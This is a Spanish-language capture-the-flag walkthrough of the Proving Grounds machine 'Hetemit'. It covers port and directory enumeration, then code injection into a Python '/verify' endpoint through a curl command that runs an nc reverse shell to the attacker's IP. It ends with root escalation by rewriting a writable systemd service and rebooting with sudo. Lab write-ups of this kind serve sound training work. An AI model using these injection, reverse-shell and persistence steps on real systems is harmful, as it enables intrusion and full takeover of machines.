---
layout: post
title: Hetemit (Linux - Intermediate) - Proving Grounds Practice
date: 12.06.2025
categories: [Linux, Proving Grounds, Proving Grounds Practice, Walkthrough, OSCP, Tutorial]
tag: [Proving Grounds Practice, Proving Grounds, Linux, Privilege Escalation, SUDOERS, SUDO, Dirsearch, Curl, Python, Flask, Werkzeug, Werkzeug httpd 1.0.1 (Python 3.6.8), Werkzeug httpd 1.0.1, Fuzzing, SystemD, systemd, /etc/systemd/system/pythonapp.service, File Permissions, Reboot, /sbin/reboot, Intermediate]
image:
  path: assets/img/post-img/PGimage-Title/PG-Title.svg
  alt: 
---

# Resolución paso a paso de la máquina Hetemit:

## ENUMERACIÓN

### NMAP

- Realizamos el primer escaneo para ver que puertos están abiertos:

```bash
nmap -p- --open -v -n 192.168.103.117 -oG allPorts
```

![image.png](assets/img/post-img/Hetemit/image.png)

- Enumeramos los **SERVICIOS ACTIVOS** en los **PUERTOS** que hemos descubierto:

```bash
nmap -sCV -p21,22,80,139,445,18000,50000 --min-rate 5000 192.168.103.117 -oN targeted
```

![image.png](assets/img/post-img/Hetemit/image%201.png)

![image.png](assets/img/post-img/Hetemit/image%202.png)

- Vemos que hay tres servidores **WEB** diferentes además de otros servicios como **FTP**, **SSH**, **SMB**… Después de un buen rato de enumeración realizando **FUZZING** en contra los tres servidores (**80**, **18000** y **5000**) descubrimos poca cosa..

- Una de las cosas que descubrimos es un panel de **LOGIN** que no nos devuelve ningún mensaje de **ERROR** cuando ponemos una credenciales invalidas, eso nos dificultaría mucho realizar **FUERZA BRUTA** ya que no podemos saber cuando hemos acertado con las credenciales y cuando no. Además también hay un **PANEL DE REGISTRO** pero no podemos registrarnos como nuevos usuarios ya que nos pide un **CÓDIGO DE INVITACIÓN** que no tenemos. También parece que si pudiéramos registrarnos podríamos aprovecharnos del campo de subida de archivos para intentar colar una **WEBSHELL** o una **REVERSE SHELL**, no obstante descartamos esta opción por ahora.

![image.png](assets/img/post-img/Hetemit/image%203.png)

![image.png](assets/img/post-img/Hetemit/image%204.png)

### DIRSEARCH

- Continuamos enumerando  y analizando el puerto **50000** vemos que corre un **SERVIDOR WEB** con PYTHON (**Werkzeug httpd 1.0.1 (Python 3.6.8)**). Realizando **FUZZING** con **DIRSEARCH** vemos que hay un directorio **VERIFY y un directorio GENERATE** que es lo mismo que encontramos cuando accedemos a la página principal por el puerto **50000:**

```bash
dirsearch  -u http://192.168.103.117:50000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x 403,400,404
```

![image.png](assets/img/post-img/Hetemit/image%205.png)

![image.png](assets/img/post-img/Hetemit/image%206.png)

![image.png](assets/img/post-img/Hetemit/image%207.png)

![image.png](assets/img/post-img/Hetemit/image%208.png)

## EXPLOTACIÓN

### Werkzeug httpd 1.0.1 (Python 3.6.8)

- Sabiendo que el servidor corre **PYTHON** la primera opción fue intentar lanzar alguna **REVERSE SHELL** directamente desde **CURL** pero no hubo manera. Sabemos que el formato en el que nos muestra la información es **JSON** o se parece mucho, incluso podemos pensar que estamos interactuando con alguna **API**. Al final realizamos una petición por **POST** con **CURL** pasándole con el parámetro **--DATA** la información, en este caso **CODE** nos hace pensar que está ejecutando código por detrás y debe ser con **PYTHON**, así que intentamos hacer una ejecución a nivel de sistema con **OS.SYSTEM** y lanzarnos la **SHELL**, y parece que funcionó:

```bash
curl -i http://192.168.243.117:50000/verify -X POST --data 'code=os.system("nc 192.168.45.154 18000 -e /bin/bash")'
```

![image.png](assets/img/post-img/Hetemit/image%209.png)

- Nos ponemos en escucha con **NC** por el puerto **18000**:

```bash
nc -lvnp 18000
```

![image.png](assets/img/post-img/Hetemit/image%2010.png)

## TRATAMIENTO DE LA TTY

- Realizamos el tratamiento de la **TTY** para poder trabajar más cómodos desde una **SHELL INTERACTIVA**:

```bash
script /dev/null -c bash

control+z

stty raw -echo; fg

reset xterm

export TERM=xterm-256color

export SHELL=bash

stty rows 52 columns 214 
```

- Una vez dentro de la máquina podemos acceder al directorio personal del usuario **CMEEKS** y leer la primera **FLAG**:

![image.png](assets/img/post-img/Hetemit/image%2011.png)

## ESCALADA DE PRIVILEGIOS

### SYSTEMD + SUDO REBOOT

- En este caso descubrimos que teníamos permisos en “**/etc/systemd/system/pythonapp.service**”.

![image.png](assets/img/post-img/Hetemit/image%2012.png)

> **SYSTEMD** es un sistema de **INICIALIZACIÓN** de **LINUX**. Es el proceso que se ejecuta con el **PID** número **1**, por lo que se arranca automáticamente cada vez que se arranque el sistema.
> 

- Al acceder al directorio y analizar el archivo descubrimos que como **GRUPO** estaba el usuario bajo el que estábamos corriendo, por lo que tenemos derechos de **ESCRITURA** sobre ese archivo. Al acceder al contenido vemos que en la variable **ExecStart**  ejecuta **FLASK** y podemos ver también en la variable **USER** que lo ejecuta bajo el usuario en el que estamos.

```bash
/etc/systemd/system/pythonapp.service
```

![image.png](assets/img/post-img/Hetemit/image%2013.png)

> Hay que tener en cuenta que para  que este método sea efectivo debemos poder reiniciar la máquina con **REBOOT**. En este caso, el usuario bajo el que nos encontramos puede ejecutar con permisos de **SUDO** el **“/SBIN/REBOOT”**.
> 

```bash
sudo -l
```

![image.png](assets/img/post-img/Hetemit/image%2014.png)

- Como tenemos privilegios de escritura sobre este archivo y sabemos que si reiniciamos la máquina con **REBOOT** se ejecutará, vamos a modificar el **SCRIPT** para que en lugar de **FLASK** nos lance una **REVERSE SHELL** y en lugar de hacerlo bajo nuestro usuario lo haga directamente como el usuario **ROOT**:
- Modificamos el **SCRIPT** para que nos lance la **REVERSE SHELL** bajo el usuario **ROOT** y modificamos también el tiempo para que sea un poco más de **15 segundos**, en este caso puse **60 segundos**:

![image.png](assets/img/post-img/Hetemit/image%2015.png)

- Reiniciamos el sistema como **SUDO** y nos ponemos en escucha con **NC** en nuestra máquina atacante por el puerto **50000**:

```bash
# Reiniciamos la máquina víctima mientras estamos en escucha con NC en nuestra máquina atacante:
sudo reboot
```

```bash
nc -lvnp 50000
```

![image.png](assets/img/post-img/Hetemit/image%2016.png)

![image.png](assets/img/post-img/Hetemit/image%2017.png)